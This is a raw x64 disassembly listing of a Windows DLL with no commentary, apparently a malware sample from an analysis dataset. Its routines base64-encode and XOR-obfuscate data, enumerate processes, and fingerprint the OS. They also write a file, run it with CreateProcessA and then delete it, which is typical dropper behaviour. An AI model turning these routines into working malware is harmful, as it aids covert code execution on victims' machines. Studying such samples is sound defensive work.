sub_180001004
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x30
and [ rax + 0x20 ] 0x0
mov esi r8d
mov rbp rdx
xor r9d r9d
lea rax [ rax + 0x20 ]
mov edx esi
lea r13d [ r9 + 0x1 ]
mov rcx rbp
mov [ rsp + 0x20 ] rax
mov r8d r13d
call [ CryptBinaryToStringA@IAT ]
mov r11 [ rw-data ]
mov rbx [ r11 ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea r12 [ r--data ]
lea rdx [ r--data ]
mov r9d r13d
mov r8d r13d
mov [ rsp + 0x20 ] r12
call [ rbx ]
mov ecx [ rsp + 0x68 ]
call j_sub_180002178
mov r8d r13d
mov edx esi
mov rdi rax
lea rax [ rsp + 0x68 ]
mov rcx rbp
mov r9 rdi
mov [ rsp + 0x20 ] rax
call [ CryptBinaryToStringA@IAT ]
mov r11 [ rw-data ]
mov rbx [ r11 ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea r8d [ r13 + 0x1 ]
lea rdx [ r--data ]
mov r9d r13d
mov [ rsp + 0x20 ] r12
call [ rbx ]
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov rax rdi
add rsp 0x30
pop r13
pop r12
pop rdi
retn
sub_1800010f0
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x40
and [ rax - 0x28 ] 0x0
and [ rax - 0x30 ] 0x0
mov ebp r8d
mov r12 rdx
mov [ rax - 0x38 ] r9
mov rsi r9
xor r9d r9d
mov edx ebp
mov rcx r12
lea r8d [ r9 + 0x1 ]
call [ CryptStringToBinaryA@IAT ]
mov r11 [ rw-data ]
mov rbx [ r11 ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov r9d 0x1
mov [ rsp + 0x28 ] eax
lea r13 [ r--data ]
lea r8d [ r9 + 0x2 ]
lea rdx [ r--data ]
mov [ rsp + 0x20 ] r13
call [ rbx ]
mov ecx [ rsi ]
call j_sub_180002178
and [ rsp + 0x30 ] 0x0
and [ rsp + 0x28 ] 0x0
mov r9 rax
mov r8d 0x1
mov edx ebp
mov rcx r12
mov rdi rax
mov [ rsp + 0x20 ] rsi
call [ CryptStringToBinaryA@IAT ]
mov r11 [ rw-data ]
mov rbx [ r11 ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov r9d 0x1
mov [ rsp + 0x28 ] eax
lea rdx [ r--data ]
lea r8d [ r9 + 0x3 ]
mov [ rsp + 0x20 ] r13
call [ rbx ]
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
mov rax rdi
add rsp 0x40
pop r13
pop r12
pop rdi
retn
sub_1800011ec
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rcx
mov ecx 0x8
call sub_180002178
xor ebx ebx
test rax rax
je r-xdata
mov rax rbx
mov rcx rax
call sub_180001ef8
jmp r-xdata
mov rax rbx
mov rcx rax
call sub_180002280
jmp r-xdata
mov ecx 0x8
mov [ rdi + 0x10 ] rax
call sub_180002178
test rax rax
je r-xdata
mov [ rdi + 0x8 ] rbx
mov rbx [ rsp + 0x30 ]
mov rax rdi
add rsp 0x20
pop rdi
retn
mov rcx rax
call sub_180002280
mov rbx rax
mov ecx 0x1
mov [ rdi ] rax
call sub_180002178
test rax rax
je r-xdata
sub_180001268
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x30
mov r14 rcx
mov rcx [ rcx + 0x10 ]
mov ebp r8d
mov r13 rdx
or r8d 0xffffffff
mov edx 0x1010101
mov dil r9b
call sub_180001f10
mov [ rsp + 0x80 ] eax
mov rax [ rw-data ]
mov rbx [ rax ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov r9d 0x1
mov [ rsp + 0x28 ] eax
lea r12 [ r--data ]
lea rdx [ r--data ]
mov r8d r9d
mov [ rsp + 0x20 ] r12
call [ rbx ]
mov r11d [ rsp + 0x80 ]
xor esi esi
xor r11d 0xaa7d756
mov [ rsp + 0x70 ] r11d
test dil dil
je r-xdata
mov rcx rbp
call j_sub_180002178
mov r8 rbp
mov rdx r13
mov rcx rax
mov r12 rax
call sub_180001748
mov rcx [ r14 + 0x8 ]
mov r8d ebp
mov rdx r13
call sub_1800016c8
mov [ rsp + 0x88 ] ax
mov rax [ rw-data ]
mov rbx [ rax ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea edi [ rsi + 0x2 ]
lea r9d [ rsi + 0x1 ]
lea rdx [ r--data ]
mov r8d edi
mov [ rsp + 0x20 ] r12
call [ rbx ]
lea rcx [ rbp + 0x2 ]
call j_sub_180002178
lea rdx [ rsp + 0x88 ]
mov r8d edi
mov rcx rax
mov r12 rax
call sub_180001748
lea rcx [ r12 + 0x2 ]
mov r8d ebp
mov rdx r13
call sub_180001748
add ebp edi
jmp r-xdata
lea ebx [ rbp + 0x4 ]
mov ecx ebx
call j_sub_180002178
lea rdx [ rsp + 0x80 ]
mov r8d 0x4
mov rcx rax
mov rsi rax
call sub_180001748
lea rcx [ rsi + 0x4 ]
mov r8d ebp
mov rdx r12
call sub_180001748
mov rcx [ r14 ]
mov r8d ebx
mov rdx rsi
call sub_180001004
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov rdi rax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
mov r9d 0x1
lea rax [ r--data ]
lea rdx [ r--data ]
lea r8d [ r9 + 0x2 ]
mov [ rsp + 0x20 ] rax
call [ rbx ]
mov rcx rsi
call j_sub_180002148
mov rcx r12
call j_sub_180002148
mov rax rdi
add rsp 0x30
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
mov rcx r12
mov edx ebp
test ebp ebp
je r-xdata
mov rax rsi
inc rsi
and eax 0x3
mov al [ rsp + rax + 0x70 ]
xor [ rcx ] al
inc rcx
dec rdx
jne r-xdata
sub_180001448
mov [ rsp + 0x10 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov r13 rcx
mov rcx [ rcx ]
mov rsi r9
lea r9 [ rsp + 0x30 ]
xor r14d r14d
mov [ rsp + 0x30 ] r14d
call sub_1800010f0
mov rdx [ rw-data ]
mov rbx [ rdx ]
mov r12 rax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea edi [ r14 + 0x4 ]
lea r15 [ r--data ]
lea r9d [ r14 + 0x1 ]
lea rdx [ r--data ]
mov r8d edi
mov [ rsp + 0x20 ] r15
call [ rbx ]
lea rcx [ rsp + 0x98 ]
mov r8d edi
mov rdx r12
mov [ rsp + 0x98 ] r14d
call sub_180001748
mov edi [ rsp + 0x30 ]
mov r11d [ rsp + 0x98 ]
add edi 0xfffffffc
xor r11d 0xaa7d756
mov ecx edi
mov [ rsp + 0x34 ] r11d
mov ebx edi
call j_sub_180002178
mov rbp rax
test edi edi
je r-xdata
lea rcx [ rsp + 0x80 ]
mov r8d 0x2
mov rdx rbp
mov [ rsp + 0x80 ] r14w
call sub_180001748
add edi 0xfffffffe
lea rcx [ rdi + 0x1 ]
mov [ rsi ] edi
call j_sub_180002178
lea rdx [ rbp + 0x2 ]
mov r8d edi
mov rcx rax
mov rsi rax
call sub_180001748
movzx edx [ rsp + 0x80 ]
mov rcx [ r13 + 0x8 ]
mov r9d edi
mov r8 rsi
call sub_180001708
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov dil al
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov r9d 0x1
mov [ rsp + 0x28 ] eax
lea rdx [ r--data ]
lea r8d [ r9 + 0x4 ]
mov [ rsp + 0x20 ] r15
call [ rbx ]
test dil dil
jne r-xdata
mov r8 r12
mov rdx rax
mov r9d r14d
sub r8 rax
mov rcx rbp
call j_sub_180002148
mov rcx r12
call j_sub_180002148
mov rbx [ rsp + 0x88 ]
mov rax rsi
add rsp 0x40
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rcx rsi
call j_sub_180002148
mov rsi r14
mov rcx r9
inc r9
and ecx 0x3
mov al [ rsp + rcx + 0x34 ]
xor al [ r8 + rdx + 0x4 ]
mov [ rdx ] al
inc rdx
dec rbx
jne r-xdata
sub_1800015ec
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
movsxd rcx r8d
mov ebx r8d
mov rdi rdx
inc rcx
call j_sub_180002178
xor ecx ecx
mov r11 rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
test ebx ebx
jle r-xdata
mov rax r11
mov r8 rax
sub rdi rax
mov r9 rbx
mov rax 0x2e8ba2e8ba2e8ba3
mul rcx
mov rax rcx
inc rcx
shr rdx 0x1
imul rdx rdx 0xb
sub rax rdx
lea rdx [ r--data ]
mov al [ rax + rdx ]
xor al [ rdi + r8 ]
mov [ r8 ] al
inc r8
dec r9
jne r-xdata
sub_180001664
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi [ rcx + 0x10 ]
mov rbx rcx
test rdi rdi
je r-xdata
mov rdi [ rbx ]
test rdi rdi
je r-xdata
mov rcx rdi
call sub_180001dbc
mov rcx rdi
call sub_180002148
mov rbx [ rbx + 0x8 ]
test rbx rbx
je r-xdata
mov rcx rdi
call sub_180001000
mov rcx rdi
call sub_180002148
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rbx
call sub_180001000
mov rcx rbx
call sub_180002148
sub_1800016c8
xor ecx ecx
mov r11 rdx
mov r10d r8d
mov r9d ecx
test r8d r8d
je r-xdata
movzx eax cx
retn
mov dl [ r9 + r11 ]
mov r8d 0x8
shr cx 0x1
shr dl 0x1
dec r8
jne r-xdata
mov eax 0x2042
xor cx ax
mov al dl
xor al cl
test al 0x1
je r-xdata
inc r9
cmp r9 r10
jb r-xdata
sub_18000172c
jmp r-xdata
mov al [ rcx ]
test al al
jne r-xdata
cmp al dl
je r-xdata
cmp al dl
jne r-xdata
mov rax rcx
retn
inc rcx
xor eax eax
retn
sub_180001768
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx r8
mov rdi rdx
mov rsi rcx
test r8 r8
jne r-xdata
call [ RtlCompareMemory@IAT ]
mov r11 rax
cmp rax rbx
je r-xdata
xor eax eax
jmp r-xdata
movzx eax [ rax + rsi ]
movzx ecx [ r11 + rdi ]
sub eax ecx
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_1800017ec
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x30
cmp [ rcx ] 0x0
mov rdi rcx
je r-xdata
lea rcx [ rdi + 0x18 ]
call [ DeleteFileA@IAT ]
mov rcx rdi
call j_sub_180002148
mov rbx [ rsp + 0x40 ]
xor eax eax
add rsp 0x30
pop rdi
retn
mov rax [ rw-data ]
mov rbx [ rax ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
mov r8d 0x1
lea rax [ r--data ]
lea rdx [ r--data ]
mov r9d r8d
mov [ rsp + 0x20 ] rax
call [ rbx ]
mov rcx [ rdi ]
or edx 0xffffffff
call [ WaitForSingleObject@IAT ]
sub_180001864
push rbx
sub rsp 0x20
mov rbx rcx
mov ecx 0x18
call sub_180002178
test rax rax
je r-xdata
and [ rbx + 0x8 ] 0x0
and [ rbx + 0x18 ] 0x0
and [ rbx + 0x10 ] 0x0
mov [ rbx ] rax
mov [ rbx + 0x20 ] 0x0
mov rax rbx
add rsp 0x20
pop rbx
retn
mov rcx rax
call sub_1800011ec
sub_1800018c0
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r13
sub rsp 0x30
mov rbp rdx
mov rsi rcx
xor r8d r8d
mov rcx rbp
xor edx edx
call [ ExpandEnvironmentStringsA@IAT ]
mov r8 [ rw-data ]
mov rbx [ r8 ]
mov edi eax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov r9d 0x1
mov [ rsp + 0x28 ] eax
lea r13 [ r--data ]
lea rdx [ r--data ]
lea r8d [ r9 + 0x1 ]
mov [ rsp + 0x20 ] r13
call [ rbx ]
mov ecx edi
call j_sub_180002178
mov r8d edi
mov rcx rbp
mov rdx rax
mov [ rsi + 0x10 ] rax
call [ ExpandEnvironmentStringsA@IAT ]
mov r11 [ rw-data ]
mov rbx [ r11 ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov r9d 0x1
mov [ rsp + 0x28 ] eax
lea rdx [ r--data ]
lea r8d [ r9 + 0x2 ]
mov [ rsp + 0x20 ] r13
call [ rbx ]
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x30
pop r13
retn
sub_1800019a4
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x50
mov rbp rcx
mov rcx [ rcx + 0x10 ]
mov r12 rdx
xor edx edx
mov edi r8d
call [ CreateDirectoryA@IAT ]
mov r11 [ rw-data ]
mov rbx [ r11 ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
mov r9d 0x1
lea rax [ r--data ]
lea r8d [ r9 + 0x3 ]
lea rdx [ r--data ]
mov [ rsp + 0x20 ] rax
call [ rbx ]
call [ GetLastError@IAT ]
cmp eax 0x3
je r-xdata
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x38 ]
mov rbp [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov ecx 0x401
call j_sub_180002178
mov r9 [ rbp + 0x8 ]
mov r8 [ rbp + 0x10 ]
lea rdx [ r--data ]
mov rcx rax
mov r13 rax
call [ wsprintfA@IAT ]
xor r14d r14d
xor r9d r9d
lea r8d [ r14 + 0x2 ]
mov [ rsp + 0x30 ] r14
mov edx 0x40000000
mov rcx r13
mov [ rsp + 0x28 ] r14d
movsxd r15 eax
mov [ rsp + 0x20 ] r8d
call [ CreateFileA@IAT ]
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov rsi rax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea rax [ r--data ]
lea r9d [ r14 + 0x1 ]
lea r8d [ r14 + 0x5 ]
lea rdx [ r--data ]
mov [ rsp + 0x20 ] rax
call [ rbx ]
cmp rsi 0xffffffffffffffff
je r-xdata
mov rcx r13
call j_sub_180002148
lea r9 [ rsp + 0x80 ]
mov r8d edi
mov rdx r12
mov rcx rsi
mov [ rsp + 0x80 ] r14d
mov [ rsp + 0x20 ] r14
call [ WriteFile@IAT ]
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov edi eax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea rax [ r--data ]
lea r9d [ r14 + 0x1 ]
lea r8d [ r14 + 0x6 ]
lea rdx [ r--data ]
mov [ rsp + 0x20 ] rax
call [ rbx ]
mov rcx rsi
call [ CloseHandle@IAT ]
xor esi esi
test edi edi
je r-xdata
lea ebx [ rsi + 0x68 ]
mov ecx ebx
call sub_180002178
lea edi [ rsi + 0x1 ]
lea ecx [ rsi + 0x18 ]
mov [ rax ] ebx
mov [ rax + 0x3c ] edi
mov r12 rax
call sub_180002178
mov r14 rax
cmp [ rbp + 0x20 ] sil
je r-xdata
cmp [ rbp + 0x18 ] rsi
je r-xdata
mov [ rsp + 0x48 ] rax
mov [ rsp + 0x40 ] r12
mov [ rsp + 0x38 ] rsi
mov [ rsp + 0x30 ] rsi
xor r9d r9d
xor r8d r8d
xor edx edx
mov rcx r13
mov [ rsp + 0x28 ] esi
mov [ rsp + 0x20 ] esi
call [ CreateProcessA@IAT ]
mov r11 [ rw-data ]
mov rbx [ r11 ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea rax [ r--data ]
lea r8d [ rsi + 0x7 ]
lea rdx [ r--data ]
mov r9d edi
mov [ rsp + 0x20 ] rax
call [ rbx ]
jmp r-xdata
cmp [ rbp + 0x21 ] sil
je r-xdata
mov ecx 0x401
call j_sub_180002178
mov rcx [ rbp ]
lea rdx [ r--data ]
mov r8d 0xc
mov rsi rax
call sub_1800015ec
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov rdi rax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
mov r9d 0x1
lea rax [ r--data ]
lea rdx [ r--data ]
lea r8d [ r9 + 0x7 ]
mov [ rsp + 0x20 ] rax
call [ rbx ]
mov r11 [ rbp + 0x18 ]
lea rdx [ r--data ]
mov r9 r13
mov r8 rdi
mov rcx rsi
mov [ rsp + 0x20 ] r11
call [ wsprintfA@IAT ]
xor eax eax
mov [ rsp + 0x48 ] r14
mov [ rsp + 0x40 ] r12
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x28 ] eax
xor r9d r9d
xor r8d r8d
mov rdx rsi
xor ecx ecx
mov [ rsp + 0x20 ] eax
call [ CreateProcessA@IAT ]
mov r11 [ rw-data ]
mov rbx [ r11 ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
mov r9d 0x1
lea rax [ r--data ]
lea r8d [ r9 + 0x8 ]
lea rdx [ r--data ]
mov [ rsp + 0x20 ] rax
call [ rbx ]
mov rcx rdi
call j_sub_180002148
mov rcx rsi
call j_sub_180002148
xor esi esi
mov rcx r14
call sub_180002148
mov rcx r12
call sub_180002148
lea rcx [ r15 + 0x19 ]
call j_sub_180002178
mov r8d 0x18
mov rdx r14
mov rcx rax
mov rdi rax
call sub_180001748
lea rcx [ rdi + 0x18 ]
mov r8 r15
mov rdx r13
call sub_180001748
lea r8 [ sub_1800017ec ]
mov r9 rdi
xor edx edx
xor ecx ecx
mov [ rsp + 0x28 ] rsi
mov [ rsp + 0x20 ] esi
call [ CreateThread@IAT ]
mov r11 [ rw-data ]
mov rbx [ r11 ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
mov r9d 0x1
lea rax [ r--data ]
lea r8d [ r9 + 0x9 ]
lea rdx [ r--data ]
mov [ rsp + 0x20 ] rax
call [ rbx ]
sub_180001d7c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi [ rcx ]
mov rbx rcx
test rdi rdi
je r-xdata
mov rcx [ rbx + 0x10 ]
call j_sub_180002148
mov [ rbx + 0x20 ] 0x0
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call sub_180001664
mov rcx rdi
call sub_180002148
sub_180001dc4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x30
xor ecx ecx
call [ Sleep@IAT ]
lea rcx [ rsp + 0x48 ]
call [ QueryPerformanceCounter@IAT ]
mov r11 [ rw-data ]
mov rbx [ r11 ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov edi 0x1
mov [ rsp + 0x28 ] eax
lea rsi [ r--data ]
lea r8d [ rdi + 0x4 ]
lea rdx [ r--data ]
mov r9d edi
mov [ rsp + 0x20 ] rsi
call [ rbx ]
xor ecx ecx
call [ Sleep@IAT ]
lea rcx [ rsp + 0x50 ]
call [ GetSystemTimeAsFileTime@IAT ]
mov r11 [ rw-data ]
mov rbx [ r11 ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea r8d [ rdi + 0x5 ]
lea rdx [ r--data ]
mov r9d edi
mov [ rsp + 0x20 ] rsi
call [ rbx ]
mov edi [ rsp + 0x48 ]
mov ebx [ rsp + 0x50 ]
xor edi [ rsp + 0x4c ]
xor ebx [ rsp + 0x54 ]
xor ecx ecx
call [ Sleep@IAT ]
call [ GetTickCount@IAT ]
mov rsi [ rsp + 0x58 ]
xor eax ebx
mov rbx [ rsp + 0x40 ]
xor eax edi
add rsp 0x30
pop rdi
retn
sub_180001e98
push rbx
sub rsp 0x20
mov rbx rcx
mov ecx 0x3e
call j_sub_180002178
mov dl 0x30
xor r8d r8d
mov [ rbx ] rax
mov rax [ rbx ]
mov [ r8 + rax ] dl
inc dl
inc r8
cmp dl 0x3a
jl r-xdata
mov cl 0x41
mov edx 0xa
mov rax [ rbx ]
mov [ rdx + rax ] cl
inc cl
inc rdx
cmp cl 0x5b
jl r-xdata
mov cl 0x61
mov edx 0x24
mov rax [ rbx ]
mov [ rdx + rax ] cl
inc cl
inc rdx
cmp cl 0x7b
jl r-xdata
add rsp 0x20
pop rbx
retn
sub_180001f10
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov ebx r8d
mov edi edx
call sub_180001dc4
sub ebx edi
xor edx edx
inc ebx
div ebx
mov rbx [ rsp + 0x30 ]
lea eax [ rdi + rdx ]
add rsp 0x20
pop rdi
retn
sub_180001f3c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x30
mov ebx edx
mov r13 rcx
lea ecx [ rbx + 0x1 ]
call j_sub_180002178
mov rsi rax
test ebx ebx
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rax rsi
mov rsi [ rsp + 0x60 ]
add rsp 0x30
pop r13
pop r12
pop rdi
retn
mov rbp rax
mov r12d ebx
xor edx edx
mov rcx r13
lea r8d [ rdx + 0x3d ]
call sub_180001f10
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov edi eax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
mov r9d 0x1
lea rax [ r--data ]
lea rdx [ r--data ]
lea r8d [ r9 + 0x3 ]
mov [ rsp + 0x20 ] rax
call [ rbx ]
mov rax [ r13 ]
mov cl [ rdi + rax ]
mov [ rbp ] cl
inc rbp
dec r12
jne r-xdata
sub_180001fe8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov r14d edx
mov r15d 0x1
mov r12 rcx
mov edx r15d
call sub_180001f10
mov r8 [ rw-data ]
mov rbx [ r8 ]
mov edi eax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea rax [ r--data ]
lea rdx [ r--data ]
mov r9d r15d
mov r8d r15d
mov [ rsp + 0x20 ] rax
call [ rbx ]
lea rcx [ r15 + r14 ]
imul rcx rdi
add rcx r15
mov r13d edi
call j_sub_180002178
xor ebp ebp
mov rsi rax
test edi edi
je r-xdata
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rax rsi
mov rsi [ rsp + 0x70 ]
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov r8d r14d
mov edx r15d
mov rcx r12
call sub_180001f10
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov edi eax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea rax [ r--data ]
lea rdx [ r--data ]
mov r9d r15d
mov r8d 0x2
mov [ rsp + 0x20 ] rax
call [ rbx ]
mov edx edi
mov rcx r12
call sub_180001f3c
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov rdi rax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea rax [ r--data ]
lea rdx [ r--data ]
mov r9d r15d
mov r8d 0x3
mov [ rsp + 0x20 ] rax
call [ rbx ]
movsxd rcx ebp
lea rdx [ r--data ]
add rcx rsi
mov r8 rdi
call [ wsprintfA@IAT ]
mov rcx rdi
add ebp eax
call j_sub_180002148
sub r13 r15
jne r-xdata
sub_180002148
push rbx
sub rsp 0x20
mov rbx rcx
call [ GetProcessHeap@IAT ]
test rax rax
je r-xdata
add rsp 0x20
pop rbx
retn
test rbx rbx
je r-xdata
mov r8 rbx
xor edx edx
mov rcx rax
call [ HeapFree@IAT ]
sub_1800021b0
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push rbp
lea rbp [ rax - 0x48 ]
sub rsp 0x140
xor r12d r12d
movzx ebx cx
movzx esi r8w
movzx edi dx
lea rcx [ rsp + 0x36 ]
mov r8d 0xfe
xor edx edx
mov [ rsp + 0x20 ] 0x11c
mov [ rsp + 0x28 ] r12
mov [ rsp + 0x30 ] r12d
mov [ rsp + 0x34 ] r12w
call sub_1800017b8
lea edx [ r12 + 0x2 ]
mov r8b 0x3
xor ecx ecx
mov [ rbp + 0x34 ] r12
call [ VerSetConditionMask@IAT ]
lea edx [ r12 + 0x1 ]
mov rcx rax
mov r8b 0x3
call [ VerSetConditionMask@IAT ]
lea edx [ r12 + 0x20 ]
mov r8b 0x3
mov rcx rax
call [ VerSetConditionMask@IAT ]
lea edx [ r12 + 0x23 ]
lea rcx [ rsp + 0x20 ]
mov r8 rax
mov [ rsp + 0x24 ] ebx
mov [ rsp + 0x28 ] edi
mov [ rbp + 0x34 ] si
call [ VerifyVersionInfoW@IAT ]
lea r11 [ rsp + 0x140 ]
mov rbx [ r11 + 0x10 ]
mov rsi [ r11 + 0x18 ]
mov rdi [ r11 + 0x20 ]
mov r12 [ r11 + 0x28 ]
test eax eax
setne al
mov rsp r11
pop rbp
retn
sub_180002284
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x160
xor edx edx
lea ecx [ rdx + 0x2 ]
call CreateToolhelp32Snapshot
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov rsi rax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov r12d 0x1
mov [ rsp + 0x28 ] eax
lea r13 [ r--data ]
lea r14 [ r--data ]
lea r8d [ r12 + 0x3 ]
mov r9d r12d
mov rdx r13
mov [ rsp + 0x20 ] r14
call [ rbx ]
lea rdx [ rsp + 0x30 ]
mov rcx rsi
mov [ rsp + 0x30 ] 0x130
call Process32First
mov r11 [ rw-data ]
mov rbx [ r11 ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea r8d [ r12 + 0x4 ]
mov r9d r12d
mov rdx r13
mov [ rsp + 0x20 ] r14
call [ rbx ]
xor edi edi
lea rcx [ rsp + 0x5c ]
call [ lstrlenA@IAT ]
lea rdx [ rsp + 0x30 ]
mov rcx rsi
lea edi [ rdi + rax + 0x1 ]
call Process32Next
test eax eax
jne r-xdata
mov rax [ rw-data ]
mov rbx [ rax ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
mov r9d r12d
mov r8d 0x6
mov rdx r13
mov [ rsp + 0x20 ] r14
call [ rbx ]
movsxd rcx edi
add rcx r12
call j_sub_180002178
lea rdx [ rsp + 0x30 ]
mov rcx rsi
mov rbp rax
xor edi edi
call Process32First
mov r11 [ rw-data ]
mov rbx [ r11 ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea r8d [ rdi + 0x7 ]
mov r9d r12d
mov rdx r13
mov [ rsp + 0x20 ] r14
call [ rbx ]
movsxd rcx edi
lea r8 [ rsp + 0x5c ]
lea rdx [ r--data ]
add rcx rbp
call [ wsprintfA@IAT ]
lea rdx [ rsp + 0x30 ]
mov rcx rsi
add edi eax
call Process32Next
test eax eax
jne r-xdata
mov rax [ rw-data ]
mov rbx [ rax ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
mov r9d r12d
mov r8d 0x8
mov rdx r13
mov [ rsp + 0x20 ] r14
call [ rbx ]
mov rcx rsi
call [ CloseHandle@IAT ]
mov r11 [ rw-data ]
mov rbx [ r11 ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
mov r9d r12d
mov r8d 0x9
mov rdx r13
mov [ rsp + 0x20 ] r14
call [ rbx ]
lea r11 [ rsp + 0x160 ]
mov rax rbp
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x28 ]
mov rsi [ r11 + 0x30 ]
mov rdi [ r11 + 0x38 ]
mov rsp r11
pop r14
pop r13
pop r12
retn
sub_180002488
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x60
mov ebx 0x9c
mov ecx ebx
call sub_180002178
mov rcx rax
mov rdi rax
mov [ rax ] ebx
call [ GetVersionExA@IAT ]
mov r11 [ rw-data ]
mov rbx [ r11 ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov r9d 0x1
mov [ rsp + 0x28 ] eax
lea rsi [ r--data ]
